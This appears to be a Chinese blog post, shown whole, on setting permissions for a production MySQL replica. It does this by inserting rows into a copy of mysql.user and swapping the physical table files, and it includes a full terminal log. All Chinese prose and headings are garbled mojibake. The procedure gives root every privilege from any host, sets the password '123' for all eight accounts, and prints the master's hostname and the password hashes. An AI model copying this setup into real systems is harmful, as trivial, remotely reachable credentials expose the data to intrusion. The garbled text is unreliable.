title="ç”Ÿäº§ç¯å¢ƒ"></a>ç”Ÿäº§ç¯å¢ƒ</h3><h4 id="ç”¨æˆ·æƒé™"><a href="#ç”¨æˆ·æƒé™" class="headerlink" title="ç”¨æˆ·æƒé™"></a>ç”¨æˆ·æƒé™</h4><p>ç›®æ ‡ï¼šIDCæœºæˆ¿ä»åº“æ”¯æŒé€šè¿‡insertã€updateã€deleteå‘½ä»¤æ¥ä¿®æ”¹ç”¨æˆ·æƒé™ï¼Œæƒé™æ¯”è¾ƒç®€å•ï¼Œåˆ†ä¸ºåªè¯»å’Œå†™ã€‚</p><p>éœ€è¦è®¾ç½®ä»¥ä¸‹æƒé™ï¼šæƒé™ä½œç”¨äºæ‰€æœ‰çš„åº“å¤šæœ‰çš„è¡¨</p><table><thead><tr><th align="left">ç”¨æˆ·å</th><th align="left">å¯†ç </th><th align="left">æƒé™</th></tr></thead><tbody><tr><td align="left">root</td><td align="left">123</td><td align="left">è¯»å†™</td></tr><tr><td align="left">joowingbuz</td><td align="left">123</td><td align="left">åªè¯»</td></tr><tr><td align="left">ottersync</td><td align="left">123</td><td align="left">åªè¯»</td></tr><tr><td align="left">syncdw</td><td align="left">123</td><td align="left">åªè¯»</td></tr><tr><td align="left">datasis</td><td align="left">123</td><td align="left">åªè¯»</td></tr><tr><td align="left">joowingv</td><td align="left">123</td><td align="left">åªè¯»</td></tr><tr><td align="left">datadev</td><td align="left">123</td><td align="left">åªè¯»</td></tr><tr><td align="left">readonly</td><td align="left">123</td><td align="left">åªè¯»</td></tr></tbody></table><h4 id="æ­¥éª¤æ¦‚è§ˆ-1"><a href="#æ­¥éª¤æ¦‚è§ˆ-1" class="headerlink" title="æ­¥éª¤æ¦‚è§ˆ"></a>æ­¥éª¤æ¦‚è§ˆ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. ç™»é™†æ•°æ®åº“åæ“ä½œå¦‚ä¸‹ï¼š</span></span><br><span class="line">use mysql;</span><br><span class="line">create table user_1 like user;</span><br><span class="line">insert into user_1 select * from user;</span><br><span class="line">delete from mysql.user_1 where user='root';</span><br><span class="line">insert into mysql.user_1 values ('%','root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','joowingbuz', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','ottersync', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','syncdw', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','datasis', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','joowingv', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','datadev', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','readonly', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. é€€å‡ºæ•°æ®åº“å¹¶åœæ­¢æœåŠ¡</span></span><br><span class="line">/data/mysql/support-files/mysql.server stop</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. å°†user_1è¡¨çš„ç‰©ç†æ–‡ä»¶è¦†ç›–userè¡¨</span></span><br><span class="line">cd /data/xtrabackup_data/mysql/</span><br><span class="line">mv user.frm user.ibd user.MYD user.MYI user.TRG /tmp</span><br><span class="line">mv user_1.frm user.frm</span><br><span class="line">mv user_1.MYI user.MYI</span><br><span class="line">mv user_1.MYD user.MYD</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. å¯åŠ¨æ•°æ®åº“</span></span><br><span class="line">/data/mysql/support-files/mysql.server start</span><br></pre></td></tr></table></figure><h4 id="æ“ä½œæ˜ç»†"><a href="#æ“ä½œæ˜ç»†" class="headerlink" title="æ“ä½œæ˜ç»†"></a>æ“ä½œæ˜ç»†</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">root@MySQL-01 15:42:  [(none)]&gt; use mysql</span><br><span class="line">Database changed</span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; create table user_1 like user;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; insert into user_1 select * from user;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; select user,host,authentication_string from mysql.user;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; select user,host,authentication_string from mysql.user_1;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; desc mysql.user_1;</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">| Field                  | Type                              | Null | Key | Default | Extra |</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">| Host                   | char(60)                          | NO   | PRI |         |       |</span><br><span class="line">| User                   | char(16)                          | NO   | PRI |         |       |</span><br><span class="line">| Password               | char(41)                          | NO   |     |         |       |</span><br><span class="line">| Select_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Insert_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Update_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Delete_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Drop_priv              | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Reload_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Shutdown_priv          | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Process_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| File_priv              | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Grant_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| References_priv        | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Index_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Alter_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Show_db_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Super_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_tmp_table_priv  | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Lock_tables_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Execute_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Repl_slave_priv        | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Repl_client_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_view_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Show_view_priv         | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_routine_priv    | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Alter_routine_priv     | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_user_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Event_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Trigger_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_tablespace_priv | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| ssl_type               | enum('','ANY','X509','SPECIFIED') | NO   |     |         |       |</span><br><span class="line">| ssl_cipher             | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| x509_issuer            | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| x509_subject           | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| max_questions          | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_updates            | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_connections        | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_user_connections   | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| plugin                 | char(64)                          | YES  |     |         |       |</span><br><span class="line">| authentication_string  | text                              | YES  |     | NULL    |       |</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">42 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:47:  [mysql]&gt; delete from mysql.user_1 where user='root';</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:51:  [mysql]&gt; insert into mysql.user_1 values ('%','root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','joowingbuz', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','ottersync', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','syncdw', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','datasis', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','joowingv', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','datadev', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','readonly', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; select user,host,authentication_string from mysql.user;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; select user,host,authentication_string from mysql.user_1;</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">| user       | host | authentication_string                     |</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">| ottersync  | %    | *9443FA914A2D69FE8832F8294E7422CC1B02A492 |</span><br><span class="line">| joowingbuz | %    | *DFFDA1CA6135E355EF468AB13A465BB5D4FE2B11 |</span><br><span class="line">| root       | %    | *89BE852E4EECFD217F0C5463FB30AD25BD0751E0 |</span><br><span class="line">| syncdw     | %    | *3DD7B4B4F6EE968FF3452B607BDEE6294B6A425A |</span><br><span class="line">| datasis    | %    | *011D511C71990F832C531A0F9CFB34CF7BB4E485 |</span><br><span class="line">| joowingv   | %    | *56B364074270DF7F6D670A6B4F5A4AD13322397A |</span><br><span class="line">| datadev    | %    | *D3D73E0F6BFC3159B024EF31484B6F9CC2963C5B |</span><br><span class="line">| readonly   | %    | *E2BA196C0C7F409990FDB3FAB5F9C7CE95F7C449 |</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@joowing-server-06:~# /data/mysql/support-files/mysql.server stop</span><br><span class="line">Shutting down MySQL</span><br><span class="line">...... * </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@joowing-server-06:~# cd /data/xtrabackup_data/</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data# cd mysql</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8æœˆ  14 15:42 user_1.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8æœˆ  14 15:52 user_1.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8æœˆ  14 15:53 user_1.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8æœˆ   9 20:14 user.frm</span><br><span class="line">-rw-r----- 1 mysql mysql 98304 8æœˆ   9 20:14 user.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   328 8æœˆ   9 20:14 user.MYD</span><br><span class="line">-rw-r--r-- 1 mysql mysql  2048 8æœˆ   9 20:14 user.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3569 8æœˆ   9 20:14 user.TRG</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8æœˆ   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user.frm user.ibd user.MYD user.MYI user.TRG /data</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8æœˆ  14 15:42 user_1.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8æœˆ  14 15:52 user_1.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8æœˆ  14 15:53 user_1.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8æœˆ   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.frm user.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.MYI user.MYI</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.MYD user.MYD</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8æœˆ  14 15:42 user.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8æœˆ  14 15:52 user.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8æœˆ  14 15:53 user.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8æœˆ   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# /data/mysql/support-files/mysql.server start</span><br><span class="line">Starting MySQL</span><br><span class="line">...... * </span><br><span class="line"></span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mysql -uroot -p'123'</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5</span><br><span class="line">Server version: 5.7.20-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:55:  [(none)]&gt; show slave status\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: rm-uf6f05k2rg95s23bp.mysql.rds.aliyuncs.com</span><br><span class="line">                  Master_User: idc_slave</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.001641</span><br><span class="line">          Read_Master_Log_Pos: 447207506</span><br><span class="line">               Relay_Log_File: joowing-server-06-relay-bin.000225</span><br><span class="line">                Relay_Log_Pos: 35529076</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.001641</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: mysql.%,sys.%,information_schema.%</span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 447207506</span><br><span class="line">              Relay_Log_Space: 35529295</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 1095052097</span><br><span class="line">                  Master_UUID: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc</span><br><span class="line">             Master_Info_File: mysql.slave_master_info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: 